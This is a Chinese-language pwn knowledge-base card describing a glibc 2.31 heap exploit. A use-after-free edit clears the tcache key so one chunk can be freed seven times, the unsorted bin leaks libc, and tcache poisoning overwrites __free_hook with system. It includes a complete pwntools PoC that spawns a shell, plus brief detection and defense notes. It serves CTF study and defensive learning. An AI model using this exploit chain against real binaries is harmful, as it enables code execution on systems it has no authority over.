---
id: binary-pwn-heap-glibc231-tcache-key-clear-repeated-free-freehook
title: glibc 2.31 UAF edit 清 tcache key：同一 chunk 反复 free 填满 tcache，切分 unsorted 块泄 libc 后毒化 __free_hook
type: scenario
domain: binary
path: binary/pwn/heap
technique: tcache-key-clear-repeated-free-freehook
aliases:
- 无限制 double free
- 同一 chunk 重复 free
- tcache key 清零
- glibc 2.31 tcache dup
- edit 已释放块清 key
- free_hook system
tags:
- pwn
- heap
- glibc-2.31
- tcache
- tcache-key
- double-free
- uaf
- unsorted-bin
- free-hook
- libc-leak
cve: []
severity: high
confidence: medium
affected_versions: glibc 2.31（原文标记 libc2.31）
status: draft
created: '2026-11-08'
updated: '2026-11-08'
---

## 一句话结论

glibc 2.31 下，若程序 `delete` 只 `free` 不置空、`edit` 又直接用 `memcpy(chunklist[idx], src, len)` 向已释放块写入任意长度，就能把已释放 chunk 用户区 `+8` 的 `tcache_entry.key` 覆写成非当前 tcache 值，绕过 double-free 检查，把同一个 chunk 连续 free 7 次填满该 size 的 tcache；再让一个 0x410 块进 unsorted bin 泄漏 `main_arena` 指针得到 libc 基址，最后改写 tcache 链的 next 指向 `__free_hook`，两次 add 分别写入 `/bin/sh` 与 `system`，`free("/bin/sh" 块)` 即触发 `system("/bin/sh")`。

## 原理

- **tcache_entry 与 double-free 检查**：glibc 2.29+ 的已释放 chunk 用户区 `+0` 是 `next`，`+8` 是 `key`（值为 `tcache_perthread_struct *`）。`_int_free` 发现 `e->key == tcache` 时会遍历该 size 的 tcache 链做物理地址比对，命中即 `double free detected in tcache 2` 并 abort。
- **清 key 绕过**：key 位于用户数据区，`free` 之后仍可写。原文 `delete(0)` 后执行 `edit(0, 0x400, b'a'*0x10)`，`memcpy` 正好覆盖前 16 字节（next 与 key），把 key 改成 `0x6161...`；再 `delete(0)` 时 key 不等于 `tcache`，检查失明，chunk 被重新头插进 tcache。重复“edit 清 key → delete”6 次加上最初的 free，`tcache[0x410]` 的 count 达到 7，链中 7 项全部指向同一个 chunk 0。
- **glibc 2.31 无 safe-linking**：tcache 的 `next` 是原始指针（safe-linking 自 2.32 才引入），因此毒化时可直接把 next 写成 `__free_hook` 的绝对地址，不需要 `target ^ (chunk >> 12)` 编码，也不需要堆地址泄露。
- **泄漏 libc**：tcache 填满后 `delete(1)`（另一个 0x410 块）无法进入 tcache，走 unsorted bin，其 `fd/bk` 指向 `main_arena` 附近。原文再 `add(0x60, '')` 申请小块，从该 unsorted 块上切分/吸收解析器噪声；返回的小块用户区首字段仍残留 `main_arena` 指针，原文先用 `edit(2, 1, b'\xe0')` 把被空 message 写入覆盖的最低位修回该 libc 下 `main_arena+96` 的低字节 `0xe0`，再 `show(2)` 读出以 `0x7f` 结尾的 6 字节，`libc_base = leak - 0x1ECBE0`（原文 glibc 2.31 的 `main_arena+96` 偏移）。
- **毒化与触发**：`edit(0, 0x400, p64(free_hook)[:6])` 改写仍在 tcache 链中的 chunk 0 的 next 为 `__free_hook`（写 6 字节即可覆盖 libc 地址）；`add(0x400, b'/bin/sh')` 取回 chunk 0，缓存头变成 `__free_hook`；`add(0x400, p64(system)[:6])` 返回 `__free_hook` 并写入 system 地址；`delete(/bin/sh 所在槽)` 触发 `free()` 的 hook 调用 `__free_hook(chunk_ptr)`，参数指向的块内容为 `/bin/sh`，即 `system("/bin/sh")`。
- **为什么能反复 free 同一块**：free 快速路径只依据 key 判重，key 又是应用可写的用户数据；只要存在“释放后写”的路径就能重置检查状态。这比寻找第二个可 free 的块简单，也解释了原文“无限制 double free，最简单危害最大”的结论。

## 触发条件

- Linux x64，glibc 2.31（原文环境；要求 tcache key 检查已启用、safe-linking 尚未引入、`__free_hook` 仍可用）。
- `delete(idx)` 只 `free(chunklist[idx])` 不置空；`edit(idx, len, data)` 直接以 `chunklist[idx]` 为目标 `memcpy`，不校验该槽是否已释放、也不校验 len 与原分配大小的关系。
- 有 `view/show` 可读取块内容（原文用于泄 libc，可选）。
- 已知目标 libc 版本（`main_arena+96`、`__free_hook`、`system` 偏移），或能通过泄露/容器匹配确定。

## 利用步骤

1. 逆向确认菜单结构：`delete` 的索引上界（原文 `a1 <= 6`）、`edit` 的 `memcpy(chunklist[a1], src, len)` 无长度校验、`new` 自动分配下一个空闲槽（原文 add 的 JSON `index` 字段固定为 1，new 不使用它）。
2. `add(0x400, b'a')` 两次得到 chunk 0、1（chunk size 均为 0x410，落在同一 tcache bin）。
3. `delete(0)` 把 chunk 0 放入 tcache；随后循环 6 次 `edit(0, 0x400, b'a'*0x10)`（覆写 next/key）→ `delete(0)`（第二至第七次 free），使 `tcache[0x410]` 中 chunk 0 重复 7 次。
4. `delete(1)`：tcache 已满，0x410 块进入 unsorted bin，用户区 `fd/bk` 变成 `main_arena` 指针。
5. `add(0x60, b'')` 处理解析器/堆噪声，`edit(2, 1, b'\xe0')` 修回小块用户区首个 libc 指针被覆盖的最低位，`show(2)` 读到 `main_arena+96`，`libc_base = leak - 0x1ECBE0`。
6. `edit(0, 0x400, p64(libc_base + libc.sym['__free_hook'])[:6])`：把 chunk 0 的 tcache next 改成 `__free_hook`。
7. `add(0x400, b'/bin/sh')` 取回 chunk 0；`add(0x400, p64(libc_base + libc.sym['system'])[:6])` 返回 `__free_hook` 并写入 system。
8. `delete(存放 '/bin/sh' 的槽号)`（原文为 3）→ `free('/bin/sh')` 被劫持为 `system('/bin/sh')`，拿 shell。

## PoC

最小化的原文链路（JSON 交互辅助函数见关联卡片）：

```python
from pwn import *

p = process('./pwn')
elf = ELF('./pwn'); libc = elf.libc
menu = b'Please input:'

def add(size, cont):
    p.sendlineafter(menu, b'{"choice":"new","index":1,"length":' + str(size).encode()
                    + b',"message":"' + cont + b'"}')

def edit(idx, length, cont):
    p.sendlineafter(menu, b'{"choice":"modify","index":' + str(idx).encode()
                    + b',"length":' + str(length).encode() + b',"message":"' + cont + b'"}')

def delete(idx):
    p.sendlineafter(menu, b'{"choice":"rm","index":' + str(idx).encode()
                    + b',"length":20,"message":"1"}')

def show(idx):
    p.sendlineafter(menu, b'{"choice":"view","index":' + str(idx).encode()
                    + b',"length":20,"message":"1"}')

add(0x400, b'a')                    # 0
add(0x400, b'a')                    # 1
delete(0)

for _ in range(6):                  # chunk0 在 tcache[0x410] 重复 7 次
    edit(0, 0x400, b'a' * 0x10)     # 覆盖 next + key
    delete(0)

delete(1)                           # tcache 满 -> 进 unsorted bin

add(0x60, b'')                      # 2: 吸收解析器噪声，从小块/unsorted 切分
edit(2, 1, b'\xe0')                 # 修回 main_arena+96 的低字节
show(2)
p.recvuntil(b'message:')
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ecbe0

edit(0, 0x400, p64(libc_base + libc.sym['__free_hook'])[:6])  # 毒化 next
add(0x400, b'/bin/sh')                                        # 3
add(0x400, p64(libc_base + libc.sym['system'])[:6])           # 4 -> __free_hook
delete(3)                                                     # free('/bin/sh') -> system

p.interactive()
```

说明：偏移 `0x1ECBE0` 与 `system`/`__free_hook` 取自原文的 glibc 2.31；换 libc 需重新计算。第 5 步的 `0xe0` 是原文对该 libc 下 `main_arena+96` 低字节的修正值，原文未复跑说明覆盖原因，推断为空 message 写入时的 NUL 覆盖。

## 变体与关联

- 变体：没有 show 时，可改用 stdout 部分覆盖、unsorted bin 残留指针写等其它 libc 泄露方式，核心仍是“清 key 后反复 free 同一块”。
- 变体：若能先把 tcache 填到 6 项再 free 两次不同块，也可得到 dup，但需要两个可 free 的块；本卡的单块重复 free 只依赖 UAF 写。
- 关联：[[binary-pwn-heap-glibc235-tcache-key-clear-stack-poison-rop]] 是同一绕过思路在 glibc 2.35 + safe-linking 下的版本（毒化到栈写 ROP）；[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]] 是 2.42+ 随机 tcache_key 下毒化 GOT 的版本。
- 关联：[[ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system]] 同为 glibc 2.31 + `__free_hook→system`，但那里靠堆溢出改写相邻空闲块的 fd，本卡靠清 tcache key 反复 free 同一块。
- 关联：[[ctf-pwn-json-input-parser-reversing]] 提供本例的 JSON 交互构造方法。

## 检测与防御

- 检测：`free` 后是否仍可写同一块（UAF write）；`memcpy` 的目标是否可能是已释放槽；同一 size 的 tcache count 是否异常快速增长；`__free_hook` 是否被写成非零。
- 防御：`free` 后立即置空指针并检查槽状态；`edit` 记录原分配大小并校验 len；升级 glibc 到 2.32+ 启用 safe-linking、2.34+ 移除 malloc/free hook；把 tcache key 放到用户不可写的元数据或用版本随机化/编码保护。
